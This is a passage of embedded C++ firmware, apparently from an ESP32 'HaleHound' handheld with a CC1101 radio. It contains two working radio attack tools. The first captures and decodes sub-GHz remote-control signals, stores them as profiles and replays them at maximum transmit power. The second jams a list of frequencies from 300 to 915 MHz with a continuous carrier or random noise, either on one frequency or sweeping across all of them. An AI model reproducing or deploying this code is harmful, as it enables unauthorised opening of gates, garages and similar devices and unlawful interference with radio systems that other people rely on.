                                    tft.print("NO SIGNAL");
                                    delay(300);
                                    tft.fillRect(60, 140, 120, 20, HALEHOUND_BLACK);
                                }
                                break;
                            case 3: // Profiles/Save
                                // TODO: Profile menu
                                break;
                            case 4: // Back
                                exitRequested = true;
                                return;
                        }
                        break;
                    }
                }
            }
        }
    }

    // Handle frequency change (LEFT/RIGHT)
    if (buttonPressed(BTN_LEFT)) {
        if (!autoScanEnabled) {
            prevFrequency();
            updateDisplay();
        }
    }

    if (buttonPressed(BTN_RIGHT)) {
        if (!autoScanEnabled) {
            nextFrequency();
            updateDisplay();
        }
    }

    // Toggle auto-scan (UP)
    if (buttonPressed(BTN_UP)) {
        toggleAutoScan();
        updateDisplay();
    }

    // Send signal (SELECT)
    if (buttonPressed(BTN_SELECT)) {
        if (signalCaptured) {
            sendSignal();
        }
    }

    // Exit (BACK or BOOT)
    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        exitRequested = true;
        return;
    }

    // Auto-scan logic
    if (autoScanEnabled) {
        unsigned long now = millis();

        if (autoScanPaused) {
            // Check if pause time expired
            if (now - autoScanPauseTime >= AUTO_SCAN_PAUSE_MS) {
                autoScanPaused = false;
                autoScanLastChange = now;
            }
        } else {
            // Check if dwell time expired
            if (now - autoScanLastChange >= AUTO_SCAN_DWELL_MS) {
                // Move to next frequency
                autoScanIndex = (autoScanIndex + 1) % frequencyCount;
                autoScanLastChange = now;

                // Tune CC1101 (mutex protects from Core 0 FFT sampling)
                if (cc1101Lock(pdMS_TO_TICKS(60))) {
                    ELECHOUSE_cc1101.setSidle();
                    ELECHOUSE_cc1101.setMHZ(frequencyList[autoScanIndex] / 1000000.0);
                    ELECHOUSE_cc1101.SetRx();
                    cc1101Unlock();
                }

                updateDisplay();
            }

            // Check RSSI for signal
            if (cc1101Lock(pdMS_TO_TICKS(10))) {
                int rssi = ELECHOUSE_cc1101.getRssi();
                cc1101Unlock();
                if (rssi > AUTO_SCAN_RSSI_THRESHOLD) {
                    autoScanPaused = true;
                    autoScanPauseTime = now;
                    updateDisplay();
                }
            }
        }
    }

    // Check for received signal via RMT (hardware capture, no interrupts)
    if (rmtRxInitialized && rmtRxRingBuf != NULL) {
        size_t rxSize = 0;
        rmt_item32_t* items = (rmt_item32_t*)xRingbufferReceive(rmtRxRingBuf, &rxSize, pdMS_TO_TICKS(5));

        if (items != NULL && rxSize > 0) {
            size_t itemCount = rxSize / sizeof(rmt_item32_t);

            // DEBUG: Show raw RMT data
            Serial.printf("[RMT] Got %d items\n", itemCount);
            if (itemCount > 0 && itemCount < 50) {
                for (size_t i = 0; i < min(itemCount, (size_t)5); i++) {
                    Serial.printf("  [%d] d0=%u d1=%u\n", i, items[i].duration0, items[i].duration1);
                }
            }

            unsigned long newValue = 0;
            int newBitLength = 0;
            int newProtocol = 0;

            if (decodeRmtSignal(items, itemCount, &newValue, &newBitLength, &newProtocol)) {
                capturedValue = newValue;
                capturedBitLength = newBitLength;
                capturedProtocol = newProtocol;
                signalCaptured = true;

                // If auto-scanning, save the frequency where signal was found
                if (autoScanEnabled) {
                    currentFreqIndex = autoScanIndex;
                }

                #if CYD_DEBUG
                Serial.println("[SUBGHZ] Captured: " + String(capturedValue) +
                              " (" + String(capturedBitLength) + " bits, proto " +
                              String(capturedProtocol) + ")");
                #endif

                drawSignalCaptured();
            }

            // Return buffer to ring buffer
            vRingbufferReturnItem(rmtRxRingBuf, (void*)items);
        }
    }

    // FFT waterfall — Core 0 samples + computes, Core 1 draws
    drawWaterfallLine();
}

bool isExitRequested() {
    return exitRequested;
}

void cleanup() {
    // Stop Core 0 FFT task first
    exitRequested = true;
    stopFFTTask();

    // Stop RMT RX
    if (rmtRxInitialized) {
        rmt_rx_stop(RMT_RX_CHANNEL);
        rmt_driver_uninstall(RMT_RX_CHANNEL);
        rmtRxInitialized = false;
        rmtRxRingBuf = NULL;
    }

    // Stop RMT TX
    if (rmtInitialized) {
        rmt_driver_uninstall(RMT_CHANNEL_0);
        rmtInitialized = false;
    }

    ELECHOUSE_cc1101.setSidle();
    spiDeselect();

    // Clean up mutex
    if (cc1101Mtx) {
        vSemaphoreDelete(cc1101Mtx);
        cc1101Mtx = NULL;
    }

    initialized = false;
    exitRequested = false;
    fftFrameReady = false;

    #if CYD_DEBUG
    Serial.println("[SUBGHZ] Cleanup complete");
    #endif
}

// ═══════════════════════════════════════════════════════════════════════════
// FREQUENCY CONTROL
// ═══════════════════════════════════════════════════════════════════════════

int getFrequencyCount() {
    return frequencyCount;
}

uint32_t getFrequency(int index) {
    if (index < 0 || index >= frequencyCount) return 0;
    return frequencyList[index];
}

float getFrequencyMHz(int index) {
    return getFrequency(index) / 1000000.0;
}

void setFrequencyIndex(int index) {
    if (index < 0) index = frequencyCount - 1;
    if (index >= frequencyCount) index = 0;
    currentFreqIndex = index;

    if (cc1101Lock(pdMS_TO_TICKS(60))) {
        ELECHOUSE_cc1101.setSidle();
        ELECHOUSE_cc1101.setMHZ(frequencyList[currentFreqIndex] / 1000000.0);
        ELECHOUSE_cc1101.SetRx();
        cc1101Unlock();
    }

    #if CYD_DEBUG
    Serial.println("[SUBGHZ] Frequency: " + String(frequencyList[currentFreqIndex] / 1000000.0, 3) + " MHz");
    #endif
}

int getFrequencyIndex() {
    return currentFreqIndex;
}

uint32_t getCurrentFrequency() {
    return frequencyList[currentFreqIndex];
}

float getCurrentFrequencyMHz() {
    return frequencyList[currentFreqIndex] / 1000000.0;
}

void nextFrequency() {
    setFrequencyIndex(currentFreqIndex + 1);
}

void prevFrequency() {
    setFrequencyIndex(currentFreqIndex - 1);
}

// ═══════════════════════════════════════════════════════════════════════════
// AUTO-SCAN
// ═══════════════════════════════════════════════════════════════════════════

void setAutoScan(bool enabled) {
    autoScanEnabled = enabled;
    if (enabled) {
        autoScanIndex = 0;
        autoScanLastChange = millis();
        autoScanPaused = false;
        #if CYD_DEBUG
        Serial.println("[SUBGHZ] Auto-scan ENABLED");
        #endif
    } else {
        #if CYD_DEBUG
        Serial.println("[SUBGHZ] Auto-scan DISABLED");
        #endif
    }
}

void toggleAutoScan() {
    setAutoScan(!autoScanEnabled);
}

bool isAutoScanEnabled() {
    return autoScanEnabled;
}

bool isAutoScanPaused() {
    return autoScanPaused;
}

// ═══════════════════════════════════════════════════════════════════════════
// SIGNAL CAPTURE
// ═══════════════════════════════════════════════════════════════════════════

bool hasSignal() {
    return signalCaptured;
}

unsigned long getCapturedValue() {
    return capturedValue;
}

int getCapturedBitLength() {
    return capturedBitLength;
}

int getCapturedProtocol() {
    return capturedProtocol;
}

int getRSSI() {
    return ELECHOUSE_cc1101.getRssi();
}

void clearSignal() {
    signalCaptured = false;
    capturedValue = 0;
    capturedBitLength = 0;
    capturedProtocol = 0;
}

// ═══════════════════════════════════════════════════════════════════════════
// SIGNAL TRANSMISSION
// ═══════════════════════════════════════════════════════════════════════════

void sendSignal() {
    sendSignal(capturedValue, capturedBitLength, capturedProtocol);
}

void sendSignal(unsigned long value, int bitLength, int protocol) {
    if (value == 0 || bitLength == 0 || protocol == 0) {
        #if CYD_DEBUG
        Serial.println("[SUBGHZ] No signal to send");
        #endif
        return;
    }

    // Disable receive
    rcSwitch.disableReceive();
    #ifdef NMRF_HAT
    pauseRmtRx();  // Hat: GDO0==GDO2, must stop RMT RX before TX
    #endif
    delay(50);

    // Switch CC1101 to TX mode at max power (mutex protects from Core 0 FFT)
    if (cc1101Lock(pdMS_TO_TICKS(200))) {
        ELECHOUSE_cc1101.setPA(12);
        ELECHOUSE_cc1101.SetTx();
        cc1101Unlock();
    }

    tft.fillRect(0, 100, SCREEN_WIDTH, 80, HALEHOUND_BLACK);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(10, 120);
    tft.print("[!] Sending (RMT)...");
    tft.setCursor(10, 140);
    tft.setTextColor(HALEHOUND_BRIGHT);
    tft.print(value);

    // Try RMT first
    bool success = sendSignalRMT(value, bitLength, protocol, 10);

    // Fallback to RCSwitch if RMT fails
    if (!success) {
        #if CYD_DEBUG
        Serial.println("[SUBGHZ] RMT failed, using RCSwitch");
        #endif
        rcSwitch.enableTransmit(CC1101_GDO0);
        rcSwitch.setProtocol(protocol);
        rcSwitch.send(value, bitLength);
        rcSwitch.disableTransmit();
    }

    delay(500);

    tft.fillRect(0, 100, SCREEN_WIDTH, 80, HALEHOUND_BLACK);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, 120);
    tft.print("[+] Done!");

    // Switch back to RX
    if (cc1101Lock(pdMS_TO_TICKS(200))) {
        ELECHOUSE_cc1101.SetRx();
        cc1101Unlock();
    }
    delay(100);
    #ifdef NMRF_HAT
    resumeRmtRx();  // Hat: restart RMT RX after TX done
    #endif
    rcSwitch.enableReceive(CC1101_GDO2);

    delay(500);
    updateDisplay();

    #if CYD_DEBUG
    Serial.println("[SUBGHZ] Signal sent: " + String(value));
    #endif
}

bool sendSignalRMT(unsigned long value, int bitLength, int protocol, int repetitions) {
    if (!rmtInitialized) {
        if (!initRMT()) {
            return false;
        }
    }

    int numSymbols = buildRMTSymbols(protocol, value, bitLength);
    if (numSymbols == 0) {
        return false;
    }

    #if CYD_DEBUG
    Serial.println("[RMT] Sending: proto=" + String(protocol) +
                  ", val=" + String(value) +
                  ", bits=" + String(bitLength) +
                  ", reps=" + String(repetitions));
    #endif

    for (int rep = 0; rep < repetitions; rep++) {
        rmtTransmit(rmtSymbols, numSymbols);
        yield();
    }

    return true;
}

// ═══════════════════════════════════════════════════════════════════════════
// PROFILE MANAGEMENT
// ═══════════════════════════════════════════════════════════════════════════

bool saveProfile(const char* name) {
    if (profileCount >= MAX_PROFILES) {
        #if CYD_DEBUG
        Serial.println("[SUBGHZ] Profile storage full");
        #endif
        return false;
    }

    if (!signalCaptured) {
        #if CYD_DEBUG
        Serial.println("[SUBGHZ] No signal to save");
        #endif
        return false;
    }

    SignalProfile profile;
    profile.frequency = frequencyList[currentFreqIndex];
    profile.value = capturedValue;
    profile.bitLength = capturedBitLength;
    profile.protocol = capturedProtocol;
    strncpy(profile.name, name, 15);
    profile.name[15] = '\0';

    int addr = EEPROM_PROFILE_START + (profileCount * sizeof(SignalProfile));

    EEPROM.begin(EEPROM_SIZE);
    EEPROM.put(addr, profile);
    profileCount++;
    EEPROM.write(EEPROM_PROFILE_COUNT_ADDR, profileCount);
    EEPROM.commit();
    EEPROM.end();

    #if CYD_DEBUG
    Serial.println("[SUBGHZ] Profile saved: " + String(name));
    #endif

    return true;
}

bool loadProfile(int index) {
    if (index < 0 || index >= profileCount) {
        return false;
    }

    int addr = EEPROM_PROFILE_START + (index * sizeof(SignalProfile));

    SignalProfile profile;
    EEPROM.begin(EEPROM_SIZE);
    EEPROM.get(addr, profile);
    EEPROM.end();

    // Find matching frequency index
    for (int i = 0; i < frequencyCount; i++) {
        if (frequencyList[i] == profile.frequency) {
            currentFreqIndex = i;
            break;
        }
    }

    capturedValue = profile.value;
    capturedBitLength = profile.bitLength;
    capturedProtocol = profile.protocol;
    signalCaptured = true;

    // Tune to frequency
    ELECHOUSE_cc1101.setSidle();
    ELECHOUSE_cc1101.setMHZ(profile.frequency / 1000000.0);
    ELECHOUSE_cc1101.SetRx();

    #if CYD_DEBUG
    Serial.println("[SUBGHZ] Profile loaded: " + String(profile.name));
    #endif

    return true;
}

bool deleteProfile(int index) {
    if (index < 0 || index >= profileCount) {
        return false;
    }

    // Shift profiles down
    EEPROM.begin(EEPROM_SIZE);
    for (int i = index; i < profileCount - 1; i++) {
        SignalProfile profile;
        int srcAddr = EEPROM_PROFILE_START + ((i + 1) * sizeof(SignalProfile));
        int dstAddr = EEPROM_PROFILE_START + (i * sizeof(SignalProfile));
        EEPROM.get(srcAddr, profile);
        EEPROM.put(dstAddr, profile);
    }
    profileCount--;
    EEPROM.write(EEPROM_PROFILE_COUNT_ADDR, profileCount);
    EEPROM.commit();
    EEPROM.end();

    #if CYD_DEBUG
    Serial.println("[SUBGHZ] Profile deleted at index " + String(index));
    #endif

    return true;
}

int getProfileCount() {
    return profileCount;
}

SignalProfile* getProfile(int index) {
    static SignalProfile profile;
    if (index < 0 || index >= profileCount) {
        return nullptr;
    }

    int addr = EEPROM_PROFILE_START + (index * sizeof(SignalProfile));
    EEPROM.begin(EEPROM_SIZE);
    EEPROM.get(addr, profile);
    EEPROM.end();

    return &profile;
}

}  // namespace ReplayAttack


// ═══════════════════════════════════════════════════════════════════════════
// ═══════════════════════════════════════════════════════════════════════════
// SUBGHZ JAMMER IMPLEMENTATION - WLAN Jammer Style UI
// Equalizer bars, skull row, gradient heat map
// ═══════════════════════════════════════════════════════════════════════════

namespace SubJammer {

// Frequency list (same as ReplayAttack)
static const float frequencyListMHz[] = {
    300.000, 303.875, 304.250, 310.000, 315.000, 318.000,
    390.000, 418.000, 433.075, 433.420, 433.920, 434.420,
    434.775, 438.900, 868.350, 915.000, 925.000
};
static const int frequencyCount = sizeof(frequencyListMHz) / sizeof(frequencyListMHz[0]);

// ═══════════════════════════════════════════════════════════════════════════
// DISPLAY CONSTANTS - INSANE EQUALIZER MODE (85 skinny bars!)
// Matches WLAN Jammer bar style exactly
// ═══════════════════════════════════════════════════════════════════════════
#define SJ_GRAPH_X 2
#define SJ_GRAPH_Y 95
#define SJ_GRAPH_WIDTH 236
#define SJ_GRAPH_HEIGHT 140
#define SJ_NUM_BARS 85       // 85 skinny bars - same density as WLAN Jammer
// Each freq maps to a bar: barIdx = freqIndex * 85 / 17 = freqIndex * 5
#define SJ_FREQ_TO_BAR(f) ((f) * SJ_NUM_BARS / 17)

// Skull rows for jammer feedback - 3 rows of 8 = 24 skulls!
#define SJ_SKULL_Y 250
#define SJ_SKULL_ROWS 3
#define SJ_SKULL_ROW_SPACING 18
#define SJ_SKULL_NUM 8

// ═══════════════════════════════════════════════════════════════════════════
// STATE VARIABLES
// ═══════════════════════════════════════════════════════════════════════════
static bool initialized = false;
static bool exitRequested = false;
static volatile bool jamming = false;
static volatile bool continuousMode = true;   // true = carrier, false = noise
static volatile bool autoSweep = false;
static volatile int currentFreqIndex = 10;    // Default to 433.920 MHz
static volatile unsigned long lastSweepTime = 0;
static unsigned long lastDisplayTime = 0;
static volatile bool freqChanged = false;     // Core 1 sets, Core 0 reads

// ═══════════════════════════════════════════════════════════════════════════
// DUAL-CORE TASK MANAGEMENT
// Core 0: CC1101 TX engine (frequency sweep + jam signal)
// Core 1: Display + touch (Arduino main loop)
// ═══════════════════════════════════════════════════════════════════════════

static TaskHandle_t sjTaskHandle = NULL;
static volatile bool sjTaskRunning = false;

#define SWEEP_INTERVAL_MS 50

// Equalizer heat levels
static uint8_t channelHeat[SJ_NUM_BARS] = {0};
static int skullFrame = 0;

// ═══════════════════════════════════════════════════════════════════════════
// SKULL ICONS
// ═══════════════════════════════════════════════════════════════════════════
static const unsigned char* sjSkulls[] = {
    bitmap_icon_skull_wifi,
    bitmap_icon_skull_bluetooth,
    bitmap_icon_skull_jammer,
    bitmap_icon_skull_subghz,
    bitmap_icon_skull_ir,
    bitmap_icon_skull_tools,
    bitmap_icon_skull_setting,
    bitmap_icon_skull_about
};

// ═══════════════════════════════════════════════════════════════════════════
// ICON BAR - 5 icons matching HaleHound style
// ═══════════════════════════════════════════════════════════════════════════
#define SJ_ICON_SIZE 16
#define SJ_ICON_NUM 6
// Layout: Back(10) | Toggle(60) | Prev(105) | Next(140) | Sweep(180) | Mode(215)
static int sjIconX[SJ_ICON_NUM] = {10, 60, 105, 140, 180, 215};
static const unsigned char* sjIcons[SJ_ICON_NUM] = {
    bitmap_icon_go_back,           // 0: Back
    bitmap_icon_start,             // 1: Toggle ON/OFF
    bitmap_icon_sort_down_minus,   // 2: Prev freq
    bitmap_icon_sort_up_plus,      // 3: Next freq
    bitmap_icon_antenna,           // 4: Auto sweep toggle
    bitmap_icon_recycle            // 5: Toggle mode (Carrier/Noise)
};

// ═══════════════════════════════════════════════════════════════════════════
// UI DRAWING FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════

static void drawIconBar() {
    tft.drawLine(0, 19, SCREEN_WIDTH, 19, HALEHOUND_MAGENTA);
    tft.fillRect(0, 20, SCREEN_WIDTH, 16, HALEHOUND_GUNMETAL);
    for (int i = 0; i < SJ_ICON_NUM; i++) {
        uint16_t color = HALEHOUND_MAGENTA;
        // Highlight start icon when jamming
        if (i == 1 && jamming) color = HALEHOUND_HOTPINK;
        // Highlight sweep icon when active
        if (i == 3 && autoSweep) color = HALEHOUND_HOTPINK;
        tft.drawBitmap(sjIconX[i], 20, sjIcons[i], SJ_ICON_SIZE, SJ_ICON_SIZE, color);
    }
    tft.drawLine(0, 36, SCREEN_WIDTH, 36, HALEHOUND_HOTPINK);
}

static void drawHeader() {
    tft.fillRect(0, 40, SCREEN_WIDTH, 52, TFT_BLACK);

    // Title — Nosifer with glitch effect
    drawGlitchText(55, "SUBGHZ JAM", &Nosifer_Regular10pt7b);

    // Status
    if (jamming) {
        drawGlitchStatus(72, "JAMMING", HALEHOUND_HOTPINK);
    } else {
        drawGlitchStatus(72, "STANDBY", HALEHOUND_GUNMETAL);
    }

    // Frequency info
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setCursor(10, 70);
    if (autoSweep) {
        tft.print("Mode: SWEEP ALL (");
        tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
        tft.printf("%.3f", frequencyListMHz[currentFreqIndex]);
        tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
        tft.print(" MHz)");
    } else {
        tft.printf("Freq: %.3f MHz", frequencyListMHz[currentFreqIndex]);
    }

    // Jam mode and sweep indicator
    tft.setCursor(10, 82);
    tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
    tft.printf("Jam: %s", continuousMode ? "CARRIER" : "NOISE");

    tft.setCursor(140, 82);
    tft.printf("Sweep: %s", autoSweep ? "AUTO" : "OFF");

    tft.drawLine(0, 92, SCREEN_WIDTH, 92, HALEHOUND_HOTPINK);
}

// Forward declaration
static void drawFreqMarkers();

// Update channel heat levels - INSANE EQUALIZER MODE (85 bars!)
// Matches WLAN Jammer heat logic exactly
static void updateChannelHeat() {
    int currentBar = SJ_FREQ_TO_BAR(currentFreqIndex);

    if (!jamming) {
        // Decay all channels when not jamming
        for (int i = 0; i < SJ_NUM_BARS; i++) {
            if (channelHeat[i] > 0) {
                channelHeat[i] = channelHeat[i] / 2;  // Fast decay when stopped
            }
        }
        return;
    }

    if (autoSweep) {
        // AUTO SWEEP MODE - INSANE EQUALIZER
        // All bars dance because we're jamming EVERYTHING
        for (int i = 0; i < SJ_NUM_BARS; i++) {
            int dist = abs(i - currentBar);

            if (i == currentBar) {
                // Direct hit - MAX HEAT
                channelHeat[i] = 125;
            } else if (dist <= 6) {
                // Splash zone - strong heat with falloff
                int splash = 110 - (dist * 12);
                channelHeat[i] = (channelHeat[i] + splash) / 2;
            } else {
                // Background chaos - all bars dance randomly
                // Base 50-80 with random variation = visible activity everywhere
                int chaos = 50 + random(40);
                channelHeat[i] = (channelHeat[i] + chaos) / 2;
            }
        }
    } else {
        // SINGLE FREQUENCY MODE - focused attack
        // Target bar gets 5-bar cluster (like WiFi channel width)
        int startBar = currentBar - 2;
        int endBar = currentBar + 2;
        if (startBar < 0) startBar = 0;
        if (endBar >= SJ_NUM_BARS) endBar = SJ_NUM_BARS - 1;

        for (int i = 0; i < SJ_NUM_BARS; i++) {
            bool isTargeted = (i >= startBar && i <= endBar);
            bool isCurrentBar = (i == currentBar);

            if (isCurrentBar) {
                // Currently being hit - MAX HEAT
                channelHeat[i] = 125;
            } else if (isTargeted) {
                // In target range - keep warm with variation
                int baseHeat = 50 + random(30);
                int dist = abs(i - currentBar);
                int neighborBoost = (dist <= 2) ? (30 - dist * 10) : 0;
                int targetHeat = baseHeat + neighborBoost;
                channelHeat[i] = (channelHeat[i] + targetHeat) / 2;
            } else {
                // Not targeted - decay
                if (channelHeat[i] > 0) {
                    channelHeat[i] = (channelHeat[i] * 3) / 4;
                }
            }
        }
    }
}

static void drawJammerDisplay() {
    // Update heat levels first
    updateChannelHeat();

    // Clear display area
    tft.fillRect(SJ_GRAPH_X, SJ_GRAPH_Y, SJ_GRAPH_WIDTH, SJ_GRAPH_HEIGHT, TFT_BLACK);

    // Draw frame
    tft.drawRect(SJ_GRAPH_X - 1, SJ_GRAPH_Y - 1, SJ_GRAPH_WIDTH + 2, SJ_GRAPH_HEIGHT + 2, HALEHOUND_MAGENTA);

    int maxBarH = SJ_GRAPH_HEIGHT - 25;

    if (!jamming) {
        // Check if any heat remains (for decay animation)
        bool hasHeat = false;
        for (int i = 0; i < SJ_NUM_BARS; i++) {
            if (channelHeat[i] > 3) { hasHeat = true; break; }
        }

        if (!hasHeat) {
            // Fully stopped - show standby bars
            for (int i = 0; i < SJ_NUM_BARS; i++) {
                int x = SJ_GRAPH_X + (i * SJ_GRAPH_WIDTH / SJ_NUM_BARS);
                int barH = 8 + (i % 5) * 2;  // Slight variation
                int barY = SJ_GRAPH_Y + SJ_GRAPH_HEIGHT - barH - 10;
                tft.drawFastVLine(x, barY, barH, HALEHOUND_GUNMETAL);
                tft.drawFastVLine(x + 1, barY, barH, HALEHOUND_GUNMETAL);
            }

            // Standby text
            tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
            tft.setTextSize(1);
            tft.setCursor(SJ_GRAPH_X + 85, SJ_GRAPH_Y + 5);
            tft.print("STANDBY");

            // Frequency markers
            drawFreqMarkers();
            return;
        }
    }

    // ═══════════════════════════════════════════════════════════════════════
    // DRAW THE EQUALIZER - 85 skinny bars of FIRE!
    // ═══════════════════════════════════════════════════════════════════════
    for (int i = 0; i < SJ_NUM_BARS; i++) {
        int x = SJ_GRAPH_X + (i * SJ_GRAPH_WIDTH / SJ_NUM_BARS);
        uint8_t heat = channelHeat[i];

        // Bar height based on heat - MORE AGGRESSIVE scaling
        int barH = (heat * maxBarH) / 100;  // Taller bars!
        if (barH > maxBarH) barH = maxBarH;
        if (barH < 8) barH = 8;  // Higher minimum

        int barY = SJ_GRAPH_Y + SJ_GRAPH_HEIGHT - barH - 8;

        // Color based on heat - vibrant gradient from cyan to hot pink
        for (int y = 0; y < barH; y++) {
            float heightRatio = (float)y / (float)barH;
            float heatRatio = (float)heat / 125.0f;

            // More aggressive color gradient
            float ratio = heightRatio * (0.3f + heatRatio * 0.7f);
            if (ratio > 1.0f) ratio = 1.0f;

            // Cyan (0, 207, 255) -> Hot Pink (255, 28, 82)
            uint8_t r = (uint8_t)(ratio * 255);
            uint8_t g = 207 - (uint8_t)(ratio * (207 - 28));
            uint8_t b = 255 - (uint8_t)(ratio * (255 - 82));
            uint16_t color = tft.color565(r, g, b);

            tft.drawFastHLine(x, barY + barH - 1 - y, 2, color);
        }

        // Add glow effect at base for hot bars
        if (heat > 80) {
            tft.drawFastHLine(x, barY + barH, 2, HALEHOUND_HOTPINK);
            tft.drawFastHLine(x, barY + barH + 1, 2, tft.color565(128, 14, 41));
        }
    }

    // Frequency markers
    drawFreqMarkers();

    // Current frequency display
    if (jamming) {
        tft.fillRect(SJ_GRAPH_X + 50, SJ_GRAPH_Y + 2, 140, 12, TFT_BLACK);
        tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
        tft.setTextSize(1);
        tft.setCursor(SJ_GRAPH_X + 55, SJ_GRAPH_Y + 3);
        tft.printf(">>> %.3f MHz <<<", frequencyListMHz[currentFreqIndex]);
    }
}

// Draw frequency markers below the equalizer bars
static void drawFreqMarkers() {
    int markerY = SJ_GRAPH_Y + SJ_GRAPH_HEIGHT - 8;

    // Map freq indices to bar positions: barIdx = freqIdx * 85 / 17
    // idx 0 = 300MHz (bar 0), idx 10 = 433MHz (bar 50), idx 14 = 868MHz (bar 70), idx 15 = 915MHz (bar 75)
    int x300 = SJ_GRAPH_X + (SJ_FREQ_TO_BAR(0) * SJ_GRAPH_WIDTH / SJ_NUM_BARS);
    int x433 = SJ_GRAPH_X + (SJ_FREQ_TO_BAR(10) * SJ_GRAPH_WIDTH / SJ_NUM_BARS);
    int x868 = SJ_GRAPH_X + (SJ_FREQ_TO_BAR(14) * SJ_GRAPH_WIDTH / SJ_NUM_BARS);
    int x915 = SJ_GRAPH_X + (SJ_FREQ_TO_BAR(15) * SJ_GRAPH_WIDTH / SJ_NUM_BARS);

    tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(x300 - 2, markerY);
    tft.print("300");
    tft.setCursor(x433 - 2, markerY);
    tft.print("433");
    tft.setCursor(x868 - 4, markerY);
    tft.print("868");
    tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
    tft.setCursor(x915 - 4, markerY);
    tft.print("915");
}

// Draw skull rows with animated wave - 3 rows of 8 = 24 skulls!
// Active frequency skull turns RED, adjacent skulls glow orange
static void drawSkulls() {
    int skullStartX = 10;
    int skullSpacing = 28;

    // Map current frequency index to skull position (0-7)
    // 17 frequencies spread across 8 skulls
    int activeSkull = currentFreqIndex * SJ_SKULL_NUM / frequencyCount;
    if (activeSkull >= SJ_SKULL_NUM) activeSkull = SJ_SKULL_NUM - 1;

    for (int row = 0; row < SJ_SKULL_ROWS; row++) {
        int rowY = SJ_SKULL_Y + (row * SJ_SKULL_ROW_SPACING);

        for (int i = 0; i < SJ_SKULL_NUM; i++) {
            int x = skullStartX + (i * skullSpacing);
            tft.fillRect(x, rowY, 16, 16, TFT_BLACK);

            uint16_t color;
            if (jamming) {
                int dist = abs(i - activeSkull);

                if (dist == 0) {
                    // ACTIVE FREQUENCY SKULL - PULSING BRIGHT RED
                    int pulse = (skullFrame + (row * 2)) % 4;
                    uint8_t brightness = 180 + (pulse * 25);  // 180-255 pulse
                    color = tft.color565(brightness, 0, 0);
                } else if (dist == 1) {
                    // ADJACENT SKULLS - ORANGE/RED GLOW (frequency neighbors)
                    int pulse = (skullFrame + i + (row * 3)) % 6;
                    uint8_t r = 200 + (pulse * 9);
                    uint8_t g = 40 + (pulse * 8);
                    color = tft.color565(r, g, 0);
                } else {
                    // Normal cyan-to-hot-pink wave for distant skulls
                    int phase = (skullFrame + i + (row * 3)) % 8;
                    if (phase < 4) {
                        float ratio = phase / 3.0f;
                        uint8_t r = (uint8_t)(ratio * 255);
                        uint8_t g = 207 - (uint8_t)(ratio * (207 - 28));
                        uint8_t b = 255 - (uint8_t)(ratio * (255 - 82));
                        color = tft.color565(r, g, b);
                    } else {
                        float ratio = (phase - 4) / 3.0f;
                        uint8_t r = 255 - (uint8_t)(ratio * 255);
                        uint8_t g = 28 + (uint8_t)(ratio * (207 - 28));
                        uint8_t b = 82 + (uint8_t)(ratio * (255 - 82));
                        color = tft.color565(r, g, b);
                    }
                }
            } else {
                color = HALEHOUND_GUNMETAL;  // Gray when inactive
            }

            tft.drawBitmap(x, rowY, sjSkulls[i], 16, 16, color);
        }

        // Status text next to skulls on first row only
        if (row == 0) {
            tft.fillRect(skullStartX + (SJ_SKULL_NUM * skullSpacing), rowY, 50, 16, TFT_BLACK);
            tft.setTextColor(jamming ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, TFT_BLACK);
            tft.setTextSize(1);
            tft.setCursor(skullStartX + (SJ_SKULL_NUM * skullSpacing) + 5, rowY + 4);
            tft.print(jamming ? "TX!" : "OFF");
        }
    }

    skullFrame++;
}

// ═══════════════════════════════════════════════════════════════════════════
// CORE 0 JAM TASK — CC1101 TX engine (frequency sweep + jam signal)
// Core 0 owns ALL CC1101 SPI access while jamming is active
// ═══════════════════════════════════════════════════════════════════════════

static void sjJamTask(void* param) {
    sjTaskRunning = true;
    unsigned long sweepTime = millis();

    while (jamming) {
        // Check if Core 1 requested a frequency change
        if (freqChanged) {
            ELECHOUSE_cc1101.setMHZ(frequencyListMHz[currentFreqIndex]);
            ELECHOUSE_cc1101.SetTx();
            freqChanged = false;
        }

        // Auto-sweep frequency hopping
        if (autoSweep && millis() - sweepTime >= SWEEP_INTERVAL_MS) {
            currentFreqIndex = (currentFreqIndex + 1) % frequencyCount;
            ELECHOUSE_cc1101.setMHZ(frequencyListMHz[currentFreqIndex]);
            ELECHOUSE_cc1101.SetTx();
            sweepTime = millis();
            lastSweepTime = sweepTime;  // Expose for display
        }

        // Transmit jam signal
        if (continuousMode) {
            // Continuous carrier - hold TX
            ELECHOUSE_cc1101.SpiWriteReg(CC1101_TXFIFO, 0xFF);
            ELECHOUSE_cc1101.SpiStrobe(CC1101_STX);
            digitalWrite(CC1101_GDO0, HIGH);
        } else {
            // Noise mode - random pulses
            for (int i = 0; i < 10; i++) {
                uint32_t noise = random(16777216);
                ELECHOUSE_cc1101.SpiWriteReg(CC1101_TXFIFO, noise >> 16);
                ELECHOUSE_cc1101.SpiWriteReg(CC1101_TXFIFO, (noise >> 8) & 0xFF);
                ELECHOUSE_cc1101.SpiWriteReg(CC1101_TXFIFO, noise & 0xFF);
                ELECHOUSE_cc1101.SpiStrobe(CC1101_STX);
                delayMicroseconds(50);
            }
        }

        vTaskDelay(1);  // Yield to watchdog
    }

    sjTaskRunning = false;
    vTaskDelete(NULL);
}

static void startJamTask() {
    if (sjTaskHandle != NULL) return;
    xTaskCreatePinnedToCore(sjJamTask, "subJam", 4096, NULL, 1, &sjTaskHandle, 0);
}

static void stopJamTask() {
    jamming = false;
    if (sjTaskHandle == NULL) return;

    // Wait for task to finish (500ms timeout)
    unsigned long start = millis();
    while (sjTaskRunning && (millis() - start < 500)) {
        delay(10);
    }

    // Force kill if task didn't exit cleanly
    if (sjTaskRunning) {
        vTaskDelete(sjTaskHandle);
    }

    sjTaskHandle = NULL;
    sjTaskRunning = false;
}

